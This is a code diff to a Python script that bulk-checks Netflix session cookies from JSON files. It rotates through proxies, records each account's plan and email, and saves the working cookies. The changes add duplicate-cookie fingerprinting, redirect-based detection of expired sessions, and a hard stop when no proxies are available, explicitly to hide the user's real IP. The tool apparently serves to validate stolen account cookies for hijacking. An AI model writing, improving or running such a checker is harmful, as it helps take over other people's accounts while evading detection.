@@ -1,4 +1,5 @@
 import json
+import hashlib
 import os
 import re
 import sys
@@ -6,6 +7,7 @@ import time
 import requests
 import tkinter as tk
 from tkinter import filedialog
+from urllib.parse import urlparse
 from requests.exceptions import RequestException, ConnectionError
 from http.client import RemoteDisconnected
 from bs4 import BeautifulSoup
@@ -48,7 +50,7 @@ extra_members = None
 country = None
 
 lock = Lock()
-num_threads = 5  # Define the maximum number of threads here
+num_threads = 10  # Define the maximum number of threads here
 
 # ───────────────────────────────────────────────────────
 # | Network Speed  | Recommended threads                |
@@ -65,6 +67,7 @@ max_retries = 3  # Define the maximum number of retries
 valid_proxies: list = []  # list of {"http": url, "https": url}
 proxy_index = 0
 USE_PROXY = False
+seen_cookie_fingerprints: set[str] = set()
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -106,6 +109,67 @@ def extract_info(response_text: str) -> dict:
 def load_cookies_from_json(path: str) -> list:
     with open(path, "r", encoding="utf-8") as f:
         return json.load(f)
+
+
+def cookie_fingerprint(cookies: list) -> str:
+    """
+    Build a stable fingerprint from actual cookie entries only.
+    Metadata rows appended by this checker do not include name/value, so they
+    are ignored and will not change duplicate detection.
+    """
+    parts = []
+    for cookie in cookies:
+        if not isinstance(cookie, dict) or "name" not in cookie or "value" not in cookie:
+            continue
+        domain = str(cookie.get("domain", "")).lower()
+        path = str(cookie.get("path", ""))
+        name = str(cookie.get("name", ""))
+        value = str(cookie.get("value", ""))
+        parts.append(f"{domain}\t{path}\t{name}\t{value}")
+    if not parts:
+        return ""
+    payload = "\n".join(sorted(parts))
+    return hashlib.sha256(payload.encode("utf-8")).hexdigest()
+
+
+def load_cookie_fingerprints(folder: str) -> set[str]:
+    fingerprints = set()
+    if not os.path.isdir(folder):
+        return fingerprints
+
+    for filename in os.listdir(folder):
+        path = os.path.join(folder, filename)
+        if not os.path.isfile(path):
+            continue
+        try:
+            fingerprint = cookie_fingerprint(load_cookies_from_json(path))
+            if fingerprint:
+                fingerprints.add(fingerprint)
+        except Exception:
+            pass
+    return fingerprints
+
+
+def proxy_label(proxies: dict | None) -> str:
+    if not proxies:
+        return "n/a"
+    return proxies.get("https") or proxies.get("http") or "n/a"
+
+
+def is_netflix_account_url(url: str) -> bool:
+    """Netflix redirects valid /YourAccount sessions to /account."""
+    parsed = urlparse(url)
+    host = parsed.netloc.lower()
+    path = parsed.path.rstrip("/").lower()
+    return host.endswith("netflix.com") and path == "/account"
+
+
+def is_netflix_login_url(url: str) -> bool:
+    """Expired cookies are redirected to a localized /login URL."""
+    parsed = urlparse(url)
+    host = parsed.netloc.lower()
+    path = parsed.path.rstrip("/").lower()
+    return host.endswith("netflix.com") and path.endswith("/login")
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -182,7 +246,9 @@ def parse_proxy_line(line: str, proxy_type: str) -> str | None:
 def validate_proxy(proxy_url: str, timeout: int = 8) -> bool:
     proxies = {"http": proxy_url, "https": proxy_url}
     try:
-        r = requests.get("https://www.google.com", proxies=proxies, timeout=timeout)
+        with requests.Session() as session:
+            session.trust_env = False
+            r = session.get("https://www.google.com", proxies=proxies, timeout=timeout)
         return r.status_code < 500
     except Exception:
         return False
@@ -247,8 +313,8 @@ def setup_proxies():
     print(Fore.CYAN + "\n[📂] A file picker will open — select your proxy list..." + Fore.RESET)
     proxy_file = pick_proxy_file()
     if not proxy_file:
-        print(Fore.RED + "[⚠️]  No file selected. Running without proxies.\n" + Fore.RESET)
-        return
+        print(Fore.RED + "[⚠️]  No file selected. Proxy mode cancelled; stopping to protect your real IP.\n" + Fore.RESET)
+        sys.exit(1)
 
     print(Fore.GREEN + f"[✔]  Proxy file : {proxy_file}" + Fore.RESET)
 
@@ -257,8 +323,8 @@ def setup_proxies():
 
     validated = load_and_validate_proxies(proxy_file, proxy_type)
     if not validated:
-        print(Fore.RED + "[⚠️]  No live proxies found. Running without proxies.\n" + Fore.RESET)
-        return
+        print(Fore.RED + "[⚠️]  No live proxies found. Stopping to protect your real IP.\n" + Fore.RESET)
+        sys.exit(1)
 
     valid_proxies = validated
     USE_PROXY = True
@@ -274,6 +340,7 @@ def open_webpage_with_cookies(session, link: str, json_cookies: list, filename: 
     global info, extra_memberships, extra_members, country
 
     session.cookies.clear()
+    session.trust_env = False
     for cookie in json_cookies:
         session.cookies.set(cookie["name"], cookie["value"])
 
@@ -288,8 +355,17 @@ def open_webpage_with_cookies(session, link: str, json_cookies: list, filename: 
     attempt = 0
     while attempt < max_retries:
         try:
-            response = session.get(link, timeout=20)
+            request_proxies = dict(session.proxies) if USE_PROXY else None
+            response = session.get(link, timeout=20, allow_redirects=True, proxies=request_proxies)
             response.raise_for_status()
+            if not is_netflix_account_url(response.url):
+                with lock:
+                    reason = "redirected to login" if is_netflix_login_url(response.url) else f"ended at {response.url}"
+                    proxy_tag = f" | Proxy: {proxy_label(request_proxies)}" if USE_PROXY else ""
+                    print(Fore.RED + f"[❌] Cookie not working — {filename} ({reason}){proxy_tag}" + Fore.RESET)
+                    expired_cookies += 1
+                return False
+
             content = response.text
             info = extract_info(content)
             soup = BeautifulSoup(content, "lxml")
@@ -299,19 +375,13 @@ def open_webpage_with_cookies(session, link: str, json_cookies: list, filename: 
                 "https://www.netflix.com/accountowner/addextramember",
                 allow_redirects=False,
                 timeout=20,
+                proxies=request_proxies,
             )
             if em_resp.status_code == 200:
                 extra_memberships += 1
                 extra_members = True
             else:
                 extra_members = False
-
-            # Logged-out detection
-            if soup.find(string="Sign In") or soup.find(string="Sign in"):
-                with lock:
-                    print(Fore.RED + f"[❌] Cookie not working — {filename}" + Fore.RESET)
-                    expired_cookies += 1
-                return False
 
             # ── Plan ──────────────────────────────────────────────────────
             raw_plan = info.get("localizedPlanName")
@@ -346,6 +416,7 @@ def open_webpage_with_cookies(session, link: str, json_cookies: list, filename: 
                     Fore.RED
                     + f"[⚠️] Request error: {e!s} — {filename} "
                     + f"(attempt {attempt + 1}/{max_retries})"
+                    + (f" | Proxy: {proxy_label(session.proxies)}" if USE_PROXY else "")
                     + Fore.RESET
                 )
             attempt += 1
@@ -371,6 +442,7 @@ def process_cookie_file(filename: str):
     url = "https://www.netflix.com/YourAccount"
     try:
         cookies = load_cookies_from_json(filepath)
+        fingerprint = cookie_fingerprint(cookies)
         with requests.Session() as session:
             if open_webpage_with_cookies(session, url, cookies, filename):
                 meta = {
@@ -390,7 +462,7 @@ def process_cookie_file(filename: str):
                 out_path = os.path.join(working_cookies_path, out_name)
 
                 with lock:
-                    if os.path.isfile(out_path):
+                    if (fingerprint and fingerprint in seen_cookie_fingerprints) or os.path.isfile(out_path):
                         print(
                             Fore.YELLOW
                             + f"[⚠️] Duplicate — {filename} | Plan: {plan} | Email: {email}"
@@ -400,6 +472,8 @@ def process_cookie_file(filename: str):
                     else:
                         with open(out_path, "w", encoding="utf-8") as jf:
                             json.dump(cookies, jf, indent=4)
+                        if fingerprint:
+                            seen_cookie_fingerprints.add(fingerprint)
                         working_cookies += 1
                         proxy_tag = (
                             f" | Proxy: {session.proxies.get('http', 'n/a')}"
@@ -433,6 +507,8 @@ def process_cookie_file(filename: str):
 # ─────────────────────────────────────────────────────────────────────────────
 
 def main():
+    global seen_cookie_fingerprints
+
     # 1. Proxy setup (ask, file-pick, validate) before any checking starts
     setup_proxies()
 
@@ -456,6 +532,8 @@ def main():
             + Fore.RESET
         )
         sys.exit(1)
+
+    seen_cookie_fingerprints = load_cookie_fingerprints(working_cookies_path)
 
     if os.path.isdir(working_cookies_path):
         print(
